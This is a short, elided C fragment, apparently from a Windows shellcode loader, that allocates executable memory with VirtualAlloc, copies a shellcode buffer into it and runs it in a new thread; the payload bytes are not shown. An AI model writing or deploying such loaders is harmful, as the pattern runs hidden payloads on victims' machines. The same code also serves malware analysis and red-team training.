...
int main(int argc, char **argv) {
  ...
  LPVOID allocate_mem =
      VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,
  ...
  memcpy(allocate_mem, shellcode, sizeof(shellcode));
  printf("Shellcode copied to allocated memory\n");

  // Create thread to execute shellcode
  HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocate_mem,
                                NULL, 0, NULL);
  if (hThread == NULL) {
  ...
  printf("Shellcode execution started\n");
